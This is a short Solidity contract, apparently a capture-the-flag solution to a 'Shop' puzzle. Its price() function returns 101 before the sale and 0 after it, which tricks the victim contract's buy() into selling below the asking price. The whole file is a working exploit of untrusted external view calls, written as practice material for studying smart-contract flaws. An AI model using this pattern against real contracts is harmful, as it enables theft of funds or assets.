// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack is Buyer{
    Shop private victimContract;

    constructor (address _victimContractAddress)
    {
        victimContract = Shop(_victimContractAddress);
    }


function price() external view override returns(uint) {
    return victimContract.isSold() ? 0 : 101;
}

function attack() public {
    victimContract.buy();
}
}